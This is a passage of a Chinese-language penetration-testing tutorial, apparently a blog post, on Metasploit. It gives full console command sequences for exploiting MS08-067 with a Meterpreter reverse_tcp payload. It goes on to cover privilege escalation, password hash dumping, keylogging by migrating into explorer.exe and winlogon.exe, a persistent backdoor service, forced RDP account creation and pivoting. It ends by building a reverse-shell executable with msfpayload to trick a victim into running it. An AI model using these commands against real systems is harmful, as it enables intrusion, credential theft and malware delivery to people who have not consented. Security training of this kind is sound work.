  <p style="margin-left:0cm;"><strong><span style="color:#000000;">在安装</span></strong><strong><span style="color:#000000;">reverse&nbsp;&nbsp;&nbsp; shell&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">时需配置攻击者的</span></strong><strong><span style="color:#000000;">IP</span></strong><strong><span style="color:#000000;">（例如</span></strong><strong><span style="color:#000000;">LHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.0.3</span></strong><strong><span style="color:#000000;">），而在安装（绑定型）</span></strong><strong><span style="color:#000000;"> bind shell&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">则没有这项设置。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">&nbsp;inline &nbsp; payload</span></strong><strong><span style="color:#00b050;">和</span></strong><strong><span style="color:#00b050;">staged&nbsp;&nbsp; &nbsp; payload&nbsp; </span></strong><strong><span style="color:#00b050;">的区别有哪些？</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">Inline&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; payload</span></strong><strong><span style="color:#000000;">属于自主型</span></strong><strong><span style="color:#00b050;">shellcode</span></strong><strong><span style="color:#00b050;">，</span></strong><strong><span style="color:#000000;">它的</span></strong><strong><span style="color:#000000;">shellcode</span></strong><strong><span style="color:#000000;">和</span></strong><strong><span style="color:#000000;">exploit</span></strong><strong><span style="color:#000000;">都在同一个程序文件里。而</span></strong><strong><span style="color:#00b050;"> staged &nbsp; payload&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">在两台主机之间建立通信隧道，并通过隧道执行</span></strong><strong><span style="color:#00b050;">shellcode</span></strong><strong><span style="color:#000000;">程序。如果对</span></strong><strong><span style="color:#000000;"> payload</span></strong><strong><span style="color:#000000;">的文件尺寸有严格要求，那么可使用</span></strong><strong><span style="color:#00b050;">&nbsp; staged payload</span></strong><strong><span style="color:#00b050;">，</span></strong><strong><span style="color:#000000;">因为它的文件尺寸比</span></strong><strong>&nbsp; </strong><strong><span style="color:#00b050;">inline payload</span></strong><strong><span style="color:#000000;">的文件小得多。</span></strong></p> 
  <ul>
   <li><strong><span style="color:#00b050;">Meterpreter</span></strong></li> 
  </ul>
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">Meterpreter</span></strong><strong><span style="color:#000000;">是一种先进的、隐蔽的、多功能的、可动态扩展的</span></strong><strong><span style="color:#000000;">payload</span></strong><strong><span style="color:#000000;">，它可在目标主机的系</span></strong><strong> </strong><strong><span style="color:#000000;">统内存里注入</span></strong><strong><span style="color:#000000;">DLL</span></strong><strong><span style="color:#000000;">（注入的</span></strong><strong><span style="color:#000000;">DLL</span></strong><strong><span style="color:#000000;">完全不会以文件形式存在）。此外，它还支持在运行期间加载</span></strong><strong> </strong><strong><span style="color:#000000;">脚本和插件。在漏洞利用的后期阶段，它的动态加载特性极大地拓宽了渗透人员的作业空</span></strong><strong> </strong><strong><span style="color:#000000;">间，方便了提权、保存系统账号、进行关键记录、驻留性后门服务、开启远程桌面等各种操</span></strong><strong> </strong><strong><span style="color:#000000;">作。默认情况下，</span></strong><strong><span style="color:#000000;">Meterpreter&nbsp;&nbsp; shell&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">会采用全程加密的通信方式。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">可通过下述指令利用漏洞并安装</span></strong><strong><span style="color:#00b050;">Meterpreter&nbsp;&nbsp;&nbsp; payload</span></strong><strong><span style="color:#00b050;">。</span></strong><strong><span style="color:#00b050;"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; msf&gt; use &nbsp;&nbsp; exploit/windows/smb/ms08_067_netapi</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set RHOST&nbsp;&nbsp; 192.168.198.132</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; show&nbsp; payloads</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="383" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085311206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="931"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">... msf&nbsp;&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set PAYLOAD</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">windows/meterpreter/reverse_tcp</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">&nbsp;msf&nbsp;&nbsp;&nbsp;&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; show&nbsp; &nbsp;&nbsp; options</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="397" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085314156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="949"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set LHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.198.129</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; exploit</span></strong></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="372" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085314237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="879"></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; help</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">通过上述指令，我们成功地连接到了被测主机的</span></strong><strong><span style="color:#000000;">Meterpreter shell</span></strong><strong><span style="color:#000000;">，然后我们通过</span></strong><strong><span style="color:#000000;">help</span></strong><strong><span style="color:#000000;">查看各种可用的命令。下一步，我们要査看当前用户的操作权限，然后通过</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; getsystem</span></strong><strong><span style="color:#000000;">脚本提升自己</span></strong><strong> </strong><strong><span style="color:#000000;">的权限为系统权限。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; getuid</span></strong></p> 
  <p style="margin-left:0cm;">&nbsp;</p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; use&nbsp;&nbsp;&nbsp;&nbsp; priv</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; getsystem&nbsp; -h</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述指令将会显示提升权限的各种技术。如果不启用任何选项，直接使用</span></strong><strong><span style="color:#000000;">getsystem</span></strong><strong><span style="color:#000000;">指令将会</span></strong><strong> </strong><strong><span style="color:#000000;">逐一尝试各种提权技术，直到成功提升到系统权限为止。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; getsystem ...got&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; system&nbsp;&nbsp;&nbsp;&nbsp; (via&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; technique&nbsp;&nbsp; 1).</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; getuid</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; sysinfo</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">Computer: CUSTDESK OS</span></strong><strong>　　</strong><strong><span style="color:#00b050;">:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Windows XP (Build 2600,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Service&nbsp; Pack&nbsp;&nbsp; 2).</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">Arch</span></strong><strong>　</strong><strong><span style="color:#00b050;">: x86</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">Language:&nbsp; en_US</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">如果在指令中启用</span></strong><strong><span style="color:#000000;">exploit&nbsp;&nbsp;&nbsp;&nbsp; -j -z</span></strong><strong><span style="color:#000000;">选项，那么漏洞利用程序将会在后台运行，您也不会进入交互式</span></strong><strong> </strong><strong><span style="color:#000000;">的</span></strong><strong><span style="color:#000000;">Meterpreter shell</span></strong><strong><span style="color:#000000;">。但是，如果程序成功建立了会话，您可以通过</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">Sessions &nbsp;&nbsp; -i&nbsp;&nbsp; id</span></strong><strong><span style="color:#000000;">指令返回</span></strong><strong><span style="color:#000000;"> shell</span></strong><strong><span style="color:#000000;">的交互界面。如需了解会话的</span></strong><strong><span style="color:#000000;">ID</span></strong><strong><span style="color:#000000;">，可使用</span></strong><strong><span style="color:#000000;">sessions&nbsp;&nbsp;&nbsp; -l</span></strong><strong><span style="color:#000000;">指令查看</span></strong><strong><span style="color:#000000;">ID</span></strong><strong><span style="color:#000000;">的确切值。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">接下来，我们要获取被测主机的系统账户和密码。</span></strong><strong><span style="color:#000000;">Windows</span></strong><strong><span style="color:#000000;">以</span></strong><strong><span style="color:#000000;">NTLM</span></strong><strong><span style="color:#000000;">哈希（</span></strong><strong><span style="color:#000000;">hash</span></strong><strong><span style="color:#000000;">）的格式保</span></strong><strong> </strong><strong><span style="color:#000000;">存用户的账号信息。很多工具和技术都可以破解</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp; NTLM </span></strong><strong><span style="color:#000000;">哈希。现在我们一起见证</span></strong><strong><span style="color:#000000;">Meterpreter </span></strong><strong><span style="color:#000000;">的真正威力。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; run&nbsp; hashdump</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">接下来，我们通过</span></strong><strong><span style="color:#000000;">Meterpreter shell&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">运行</span></strong><strong><span style="color:#000000;">keylog </span></strong><strong><span style="color:#000000;">程序，记录键盘输入的内容。键盘敲击记录</span></strong><strong> </strong><strong><span style="color:#000000;">可能含有目标主机的多项敏感信息。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; getuid</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">接下来，我们把</span></strong><strong><span style="color:#000000;"> Meterpreter shell&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">插入</span></strong><strong><span style="color:#000000;">&nbsp; explorer.exe </span></strong><strong><span style="color:#000000;">的进程（</span></strong><strong><span style="color:#000000;">3172</span></strong><strong><span style="color:#000000;">），以便开始记录当前用</span></strong><strong> </strong><strong><span style="color:#000000;">户对系统的操作，所涉及的指令如下。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; migrate&nbsp;&nbsp; 3172</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">现在就可以启动键盘记录程序。此后，我们等待程序录取键盘记录。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; keyscan_dump</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; keyscan_stop</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述信息表明，键盘记录程序记录了被测主机的网上活动。类似地，我们可以把它注入到</span></strong><strong><span style="color:#000000;"> winlogon.exe</span></strong><strong><span style="color:#000000;">（</span></strong><strong><span style="color:#000000;">pid 648</span></strong><strong><span style="color:#000000;">）进程里，获取所有账户的登录信息。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">经过上述操作，我们已经获取了被测主机的操作权限。但是如果目标主机安装了漏洞修复程</span></strong><strong> </strong><strong><span style="color:#000000;">序的补丁，我们就无法利用原有漏洞攻击有关服务或应用程序。为了避免这一情况，我们可</span></strong><strong> </strong><strong><span style="color:#000000;">以通过常人所说的</span></strong><strong><span style="color:#000000;">“</span></strong><strong><span style="color:#000000;">后门</span></strong><strong><span style="color:#000000;">”</span></strong><strong><span style="color:#000000;">服务程序维护自己对目标主机的控制。务必要注意：一旦在被测主机</span></strong><strong> </strong><strong><span style="color:#000000;">上安装了</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Meterpreter</span></strong><strong><span style="color:#000000;">提供的后门服务程序，所有人都可以控制被测主机；因为这个后面服务</span></strong><strong> </strong><strong><span style="color:#000000;">程序不对连入的控制端进行身份验证。换句话说，这个程序可能会让不请自来的人控制被测</span></strong><strong> </strong><strong><span style="color:#000000;">主机，这无疑是对被测单位形成了安全威胁。在正式的渗透测试业务中，这种有利于第三方</span></strong><strong> </strong><strong><span style="color:#000000;">攻击的行为通常都被服务合同明文禁止。所以，我们不建议您在正式的测试环境中使用</span></strong><strong><span style="color:#000000;"> Meterpreter </span></strong><strong><span style="color:#000000;">提供的后门服务程序。您也应当在拟定合同的范围界定阶段明确有关规则。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; exploit</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; ps</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; migrate&nbsp;&nbsp; 1544</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">通过上述指令，我们在被测主机上安装了后门服务程序，现在可以关闭当前的</span></strong><strong><span style="color:#000000;">meterpreter</span></strong><strong><span style="color:#000000;">会</span></strong><strong> </strong><strong><span style="color:#000000;">话。在需要控制被测主机的时候，我们可以调用</span></strong><strong><span style="color:#000000;">multi/handler</span></strong><strong><span style="color:#000000;">中的</span></strong><strong><span style="color:#000000;">windows/metsvc_bind_tcp payload</span></strong><strong><span style="color:#000000;">，通过后门控制远程主机。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; exit</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(ms08_067_netapi)&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; back msf &gt;&nbsp;&nbsp;&nbsp; use&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exploit/multi/handler</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(handler)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set &nbsp; PAYLOAD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; windows/metsvc_bind_tcp</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(handler)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set &nbsp; LPORT &nbsp;&nbsp;&nbsp;&nbsp; 31337</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(handler)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set &nbsp; RHOST &nbsp; 192.168.0.7</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(handler)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; exploit</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; getuid</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">此外，</span></strong><strong><span style="color:#000000;">Meterpreter </span></strong><strong><span style="color:#000000;">的</span></strong><strong><span style="color:#000000;"> getgui </span></strong><strong><span style="color:#000000;">脚本也很有用，它可开启目标主机的远程桌面功能。如需在目标</span></strong><strong> </strong><strong><span style="color:#000000;">主机上创建新的账号，并强制启用远程桌面服务，可使用下述指令。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">meterpreter&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; run&nbsp; getgui &nbsp;&nbsp;&nbsp; -u&nbsp; &nbsp;&nbsp;&nbsp; btuser&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; -p&nbsp;&nbsp;&nbsp; &nbsp; btpass</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">现在，我们可通过</span></strong><strong><span style="color:#000000;">&nbsp; rdesktop </span></strong><strong><span style="color:#000000;">程序登录目标主机。我们新建一个终端窗口，并在其中输入下述</span></strong><strong> </strong><strong><span style="color:#000000;">指令。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">#rdesktop&nbsp; &nbsp;&nbsp; 192.168.0.7:3389</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">请注意：如果已经破解了目标主机的账户名和密码，就不需要新建任何账号，直接执行</span></strong><strong><span style="color:#000000;"> run getgui&nbsp;&nbsp;&nbsp;&nbsp; -e&nbsp; </span></strong><strong><span style="color:#000000;">命令启用远程桌面就可以了。另外，在完成渗透工作以后，记得要在</span></strong><strong><span style="color:#000000;">Meterpreter shell&nbsp; </span></strong><strong><span style="color:#000000;">里使用</span></strong><strong><span style="color:#000000;">getgui/clean_up&nbsp; </span></strong><strong><span style="color:#000000;">脚本程序，以清理痕迹。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">如果目标网络不可从外部直接访问，那么应该采取那些手段进一步渗透该网络呢？</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">能够通过跳板进行操作。您可通过</span></strong><strong><span style="color:#000000;">routeaddtargetSubnettargetSubnetMask SessionId&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">的指令，将某个会话指定为跳板。此处</span></strong><strong><span style="color:#000000;"> SessionId </span></strong><strong><span style="color:#000000;">指代已经建立的</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Meterpreter&nbsp;&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">会</span></strong><strong> </strong><strong><span style="color:#000000;">话（即跳板网关），</span></strong><strong><span style="color:#000000;">&nbsp; targetsubnet</span></strong><strong><span style="color:#000000;">参数指代下一步需要测试的网段（如果被攻陷的主机是双网</span></strong><strong> </strong><strong><span style="color:#000000;">设备，则可以是它的另一个网段）。</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">会通过跳板转发指定的网络流量，这样就可以</span></strong><strong> </strong><strong><span style="color:#000000;">继续渗透、测试那些无法直接访问到的网络设备。转发流量的主机，就是通常所说的</span></strong><strong><span style="color:#000000;">“</span></strong><strong><span style="color:#000000;">跳</span></strong><strong> </strong><strong><span style="color:#000000;">板</span></strong><strong><span style="color:#000000;">”</span></strong><strong><span style="color:#000000;">或</span></strong><strong><span style="color:#000000;">“</span></strong><strong><span style="color:#000000;">立足点</span></strong><strong><span style="color:#000000;">”</span></strong><strong><span style="color:#000000;">。</span></strong><strong> </strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">场景</span></strong><strong><span style="color:#00b050;">4</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述案例演示了</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">框架利用被测主机的远程漏洞的具体方法。那么如何利用客户端程</span></strong><strong> </strong><strong><span style="color:#000000;">序的漏洞（</span></strong><strong><span style="color:#000000;">client-side exploitation</span></strong><strong><span style="color:#000000;">）呢？就此问题，本文将以渗透测试人员的角度，通过典型</span></strong><strong> </strong><strong><span style="color:#000000;">案例介绍</span></strong><strong><span style="color:#000000;">Metasploit</span></strong><strong><span style="color:#000000;">在利用客户端程序的漏洞方面的角色，帮助读者了解它的灵活性和强大功</span></strong><strong> </strong><strong><span style="color:#000000;">能。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">生成后门程序</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">Metasploit </span></strong><strong><span style="color:#000000;">的</span></strong><strong><span style="color:#000000;"> msfpayload&nbsp; </span></strong><strong><span style="color:#000000;">工具能够生成可单独运行的、执行指定</span></strong><strong><span style="color:#000000;">&nbsp;&nbsp;&nbsp;&nbsp; Metasploit&nbsp;&nbsp; payload</span></strong><strong><span style="color:#000000;">的后门</span></strong><strong> </strong><strong><span style="color:#000000;">程序。如果只能采取社会工程学手段对目标进行渗透，那么这种手段就真是救命稻草了。在</span></strong><strong> </strong><strong><span style="color:#000000;">本例中，我们将生成一个带有</span></strong><strong><span style="color:#000000;">reverse&nbsp; shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; payload</span></strong><strong><span style="color:#000000;">的可执行文件，然后把它发给目标人物，</span></strong><strong> </strong><strong><span style="color:#000000;">诱使他</span></strong><strong><span style="color:#000000;">/</span></strong><strong><span style="color:#000000;">她执行这个文件。</span></strong><strong><span style="color:#000000;">msfpayload</span></strong><strong><span style="color:#000000;">程序可以生成多种语言的程序，输出</span></strong><strong><span style="color:#000000;">Perl</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">C</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">Raw</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;"> Ruby</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">JavaScript</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">Exe</span></strong><strong><span style="color:#000000;">、</span></strong><strong><span style="color:#000000;">DLL</span></strong><strong><span style="color:#000000;">和</span></strong><strong><span style="color:#000000;">VBA</span></strong><strong><span style="color:#000000;">等格式的文件。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">如需启动</span></strong><strong><span style="color:#000000;">msfpayload</span></strong><strong><span style="color:#000000;">工具，可在</span></strong><strong><span style="color:#000000;">shell</span></strong><strong><span style="color:#000000;">中执行下述指令。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">#msfpayload&nbsp;&nbsp;&nbsp;&nbsp; -h</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">上述指令将会显示它的使用说明，并列出所有可用的</span></strong><strong><span style="color:#000000;">payload</span></strong><strong><span style="color:#000000;">。它的指令格式和</span></strong><strong><span style="color:#000000;">MSFCLI</span></strong><strong><span style="color:#000000;">非常</span></strong><strong> </strong><strong><span style="color:#000000;">相似。现在，我们通过下述指令创建一个带有</span></strong><strong><span style="color:#000000;">reverse shell&nbsp;&nbsp; payload&nbsp;&nbsp; </span></strong><strong><span style="color:#000000;">的可执行程序。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">#msfpayload&nbsp;&nbsp; &nbsp; windows/shell_reverse_tcp LHOST=192.168.0.3&nbsp;&nbsp;&nbsp;&nbsp; LPORT=33333&nbsp;&nbsp;&nbsp; O</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">#msfpayload&nbsp; &nbsp; windows/shell_reverse_tcp LHOST=192.168.0.3&nbsp; LPORT=33333&nbsp;&nbsp;&nbsp; &nbsp; X &gt;/tmp/poker.exe </span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">这样，我们就生成了自己的后门程序。在把它发送到受害人或目标之前，您必须在</span></strong><strong><span style="color:#000000;"> MSFConsle</span></strong><strong><span style="color:#000000;">里使用</span></strong><strong><span style="color:#000000;">multi/handler</span></strong><strong><span style="color:#000000;">做好服务端的准备，以便它可受理可执行文件连入本机的请</span></strong><strong> </strong><strong><span style="color:#000000;">求。这时候，要使</span></strong><strong><span style="color:#000000;">multi/handler</span></strong><strong><span style="color:#000000;">的配置和</span></strong><strong><span style="color:#000000;">msfpayload</span></strong><strong><span style="color:#000000;">在创建程序时的配置相匹配。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">&nbsp;msf&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; use&nbsp; exploit/multi/handler</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(handler)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set &nbsp; PAYLOAD windows/shell_reverse_tcp</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(handler)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; show &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; options</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">... msf&nbsp;&nbsp; exploit(handler)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set&nbsp; &nbsp; LHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.0.3</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(handler)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; set&nbsp; &nbsp; LPORT&nbsp; 33333</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#00b050;">msf&nbsp; exploit(handler)&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp; exploit </span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">现在，我们可以把准备好的</span></strong><strong><span style="color:#000000;">Windows</span></strong><strong><span style="color:#000000;">可执行文件通过社会工程欺骗方法发送给目标机器，然后等待对方运行。</span></strong></p> 
  <p style="margin-left:0cm;"><strong><span style="color:#000000;">如果在</span></strong><strong><span style="color:#000000;"> MSFConsole </span></strong><strong><span style="color:#000000;">里看见了上述信息，就表明目标主机发起了</span></strong><strong><span style="color:#000000;"> reverse&nbsp; shell</span></strong><strong><span style="color:#000000;">，我们成功地</span></strong><strong> </strong><strong><span style="color:#000000;">连接到了被测主机的</span></strong><strong><span style="color:#000000;">shell</span></strong><strong><span style="color:#000000;">，圆满地完成了任务。</span></strong></p> 
